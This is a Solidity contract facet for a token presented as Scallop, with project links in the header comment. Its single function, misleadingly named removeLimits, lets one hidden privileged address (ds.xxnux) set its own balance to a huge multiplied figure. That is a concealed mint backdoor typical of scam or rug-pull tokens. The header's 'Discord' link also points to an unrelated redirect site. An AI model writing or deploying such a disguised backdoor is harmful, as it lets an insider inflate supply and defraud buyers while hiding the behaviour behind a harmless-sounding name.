/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.scallop.io/
 * Whitepaper: https://docs.scallop.io/
 * Twitter: https://twitter.com/Scallop_io
 * Telegram Group: https://t.me/scallop_io
 * Discord Chat: https://airdrops.io/visit/0ll2/
 * Medium: https://medium.com/scallopio
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
